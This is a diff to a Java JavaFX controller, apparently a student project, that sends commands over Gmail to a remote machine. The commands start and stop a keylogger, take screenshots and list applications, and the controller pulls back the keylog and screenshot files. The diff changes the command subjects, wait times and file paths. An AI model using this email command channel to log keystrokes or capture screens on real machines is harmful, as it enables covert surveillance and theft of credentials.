@@ -50,7 +50,7 @@ public class ClientController {
             System.exit(0);
         }
     }
-    private String key = "REFORUMP";
+    private String key = "KGOXNVIC";
     private String to = "projectmangmaytinh2004@gmail.com";
 
     // Sender's email ID needs to be mentioned
@@ -96,7 +96,7 @@ public class ClientController {
                 send.setSubject(key+ " "+ number[4]);
                 send.sendContent("4");
                 try {
-                    Thread.sleep(10000);
+                    Thread.sleep(15000);
                 } catch (InterruptedException e) {
                     throw new RuntimeException(e);
                 }
@@ -117,7 +117,7 @@ public class ClientController {
                         responeScr.setText("Successful!");
                     });
                 }
-                else{
+                else  {
                     Platform.runLater(()->{
                         buttonscrshot.setDisable(false);
                         responeScr.setText("Failed, please send again!");
@@ -133,7 +133,7 @@ public class ClientController {
     public void OnButtonZoom(ActionEvent event) throws IOException{
         if (!buttonzoom.isDisable()){
             Platform.runLater(()->{
-                File file = new File("src/main/resources/com/example/project/image/screenshot.png");
+                File file = new File("src/main/resources/com/example/project/file/screen.png");
                 Image imageshow = new Image(file.toURI().toString());
                 ImageView imageView = new ImageView(imageshow);
                 imageView.setFitHeight(780);
@@ -151,7 +151,7 @@ public class ClientController {
     }
     public void OnButtonSaveas(ActionEvent event) throws IOException{
         System.out.println("saveas");
-        String sourceFilePath = "src/main/resources/com/example/project/image/screenshot.png";
+        String sourceFilePath = "src/main/resources/com/example/project/file/screen.png";
         if (!buttonsaveasScr.isDisable()){
             Platform.runLater(()->{
                 FileDialog fileDialog = new FileDialog(new Frame(), "Save As", FileDialog.SAVE);
@@ -186,11 +186,13 @@ public class ClientController {
         Alert alert = new Alert(Alert.AlertType.CONFIRMATION, "Are you sure you want to keylogger?", ButtonType.YES, ButtonType.NO);
         alert.showAndWait();
         if (alert.getResult() == ButtonType.YES) {
+            number[1]+=1;
             Platform.runLater(() -> {
                 buttonLogTurnOn.setDisable(true);
             });
             Thread newThread = new Thread(() -> {
-                send.sendContent("keylogger turnon");
+                send.setSubject(key+ " "+ number[1]);
+                send.sendContent("1");
                 Platform.runLater(() -> {
                     buttonLogTurnOff.setDisable(false);
                 });
@@ -201,20 +203,22 @@ public class ClientController {
         }
     }
     public void OnButtonLogTurnOff(ActionEvent event) throws IOException{
+        number[2]+=1;
         if (!buttonLogTurnOff.isDisable()){
             Platform.runLater(() -> {
                 buttonLogTurnOff.setDisable(true);
             });
             Thread newThread = new Thread(() -> {
-                send.sendContent("keylogger turnoff");
+                send.setSubject(key+ " "+ number[2]);
+                send.sendContent("2");
                 try {
-                    Thread.sleep(10000);
+                    Thread.sleep(15000);
                 } catch (InterruptedException e) {
                     throw new RuntimeException(e);
                 }
                 receiveMail receive = new receiveMail(username,password);
                 receive.receiveFile();
-                if (true){
+                if (receive.getContent().equals(key+" "+ number[2])){
                     File oldfile = new File("src/main/resources/com/example/project/file/keylog.txt");
                     oldfile.delete();
                     File file = new File("src/main/resources/com/example/project/file/keylog.txt");
@@ -403,20 +407,33 @@ public class ClientController {
     private TableColumn<TaskInfo.Application,String> app_Name;
     private ObservableList<TaskInfo.Application> Applist;
     public void OnButtonStartApp(ActionEvent event){
+        number[0]+=1;
         Platform.runLater(()->{
             buttonStartApp.setDisable(true);
         });
         Thread thread = new Thread(()->{
-            send.sendContent("getapplication");
-            //receive maill
-            Platform.runLater(()->{
-                System.out.println("ok");
-                Applist = FXCollections.observableArrayList();
-                app_Name.setCellValueFactory(new PropertyValueFactory<TaskInfo.Application, String>("app_Name"));
-                loadAppFromFile();
-                app_Table.setItems(Applist);
-                buttonStartApp.setDisable(false);
-            });
+            send.setSubject(key +" "+ number[0]);
+            send.sendContent("0");
+            try {
+                Thread.sleep(15000);
+            } catch (InterruptedException e) {
+                throw new RuntimeException(e);
+            }
+            File oldfile = new File("src/main/resources/com/example/project/file/listApp.txt");
+            oldfile.delete();
+            receiveMail receive = new receiveMail(username,password);
+            receive.receiveMail();
+            System.out.println(receive.getContent());
+            if (receive.getContent().equals(key+" "+number[0])) {
+                Platform.runLater(() -> {
+                    System.out.println("ok");
+                    Applist = FXCollections.observableArrayList();
+                    app_Name.setCellValueFactory(new PropertyValueFactory<TaskInfo.Application, String>("app_Name"));
+                    loadAppFromFile();
+                    app_Table.setItems(Applist);
+                    buttonStartApp.setDisable(false);
+                });
+            }
         });
         thread.start();
     }
